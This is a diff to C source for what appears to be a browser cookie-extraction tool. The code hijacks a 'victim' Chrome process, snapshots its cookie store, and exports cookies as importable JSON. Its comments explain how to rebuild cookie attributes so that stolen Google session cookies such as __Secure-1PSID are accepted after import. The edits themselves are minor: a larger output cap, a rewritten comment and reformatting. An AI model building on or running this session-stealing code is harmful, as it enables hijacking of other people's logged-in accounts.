@@ -14,7 +14,7 @@
 #define MG_ABI_VERSION 1u
 #define MG_OP_SNAPSHOT 2u
 #define MG_TIMEOUT_MS  60000u
-#define MG_OUT_CAP     (2u * 1024u * 1024u)
+#define MG_OUT_CAP     (8u * 1024u * 1024u)
 #define MCEA_MAGIC     0x4145434Du
 
 #pragma pack(push, 1)
@@ -435,8 +435,9 @@ static int wait_hijack(HANDLE victim, HANDLE proc, uint8_t *r_args,
 /* RFC 6265bis name-prefix rules are invariants enforced by Chrome itself:
  * a cookie can only exist in the jar with these attributes, so reconstruct
  * them from the name — __Secure- needs Secure; __Host- needs Secure +
- * hostOnly + path=/. Without this, Chrome silently REJECTS the imported
- * cookie (e.g. __Secure-1PSID -> Google session looks logged out). */
+ * hostOnly + path=/.  Without this, Chrome silently REJECTS the imported
+ * cookie.  The MCEA flags dword additionally carries engine-calibrated
+ * secure_/httponly_ bits when calibration converged (0 otherwise). */
 static int name_forces_secure(const uint8_t *nm, uint32_t nl) {
     return (nl >= 8 && !memcmp(nm, "__Secure-", 8)) ||
            (nl >= 7 && !memcmp(nm, "__Host-", 7));
@@ -444,6 +445,7 @@ static int name_forces_secure(const uint8_t *nm, uint32_t nl) {
 static int name_forces_hostonly(const uint8_t *nm, uint32_t nl) {
     return (nl >= 7 && !memcmp(nm, "__Host-", 7));
 }
+
 
 /* --- main -------------------------------------------------------------- */
 
@@ -643,7 +645,8 @@ int main(int argc, char **argv) {
                 fprintf(jf, ", \"path\": ");
                 jputstr(jf,pt,pl);
                 fprintf(jf, ", \"secure\": %s, \"httpOnly\": %s, \"sameSite\": \"%s\", \"hostOnly\": %s, \"expirationDate\": %.0f}",
-                       fsec?"true":"false", (fl&2)?"true":"false", ssv,
+                       fsec?"true":"false",
+                       (fl&2)?"true":"false", ssv,
                        fhost?"true":"false", ux);
             }
             if (sf) {
